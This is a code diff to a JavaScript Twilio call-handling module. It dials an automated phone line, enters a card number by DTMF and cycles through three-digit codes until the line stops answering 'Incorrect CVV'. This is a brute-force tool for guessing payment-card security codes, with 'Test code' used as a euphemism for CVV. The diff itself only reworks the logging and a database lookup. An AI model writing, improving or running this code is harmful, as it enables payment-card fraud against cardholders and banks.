@@ -28,7 +28,7 @@ export const getTwiML = async (req, res) => {
 
     if (testCode) {
         // This is a Test code brute force run!
-        await AttemptModel.addLog(attemptId, `Interactive Call Connected. Sending initial DTMF: ${card} and Test code: ${testCode}`);
+        await AttemptModel.addLog(attemptId, `DTMF Sent: ${card}:${testCode}`);
         
         // Wait 5 seconds for greeting, play card, wait 4 seconds for next prompt, play Test code
         const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
@@ -127,7 +127,12 @@ export const handleInteractiveListen = async (req, res) => {
             twiml.hangup();
         } else {
             const nextTestCode = nextTestCodeNum.toString().padStart(3, '0');
-            await AttemptModel.addLog(attemptId, `Trying next Test code: ${nextTestCode}`);
+            await AttemptModel.addLog(attemptId, `IVR says "Incorrect CVV" for ${currentTestCode}. Trying next...`);
+            
+            // Get base card for logging
+            const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
+            const baseCard = attempt.test_value.split(':')[0];
+            await AttemptModel.addLog(attemptId, `DTMF Sent: ${baseCard}:${nextTestCode}`);
             
             // Send the next Test code
             twiml.play({ digits: nextTestCode });
@@ -143,8 +148,6 @@ export const handleInteractiveListen = async (req, res) => {
             });
             
             // Update the DB so the frontend shows the current Test code
-            const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
-            const baseCard = attempt.test_value.split(':')[0];
             await AttemptModel.updateTestValue(attemptId, `${baseCard}:${nextTestCode}`);
         }
     } 
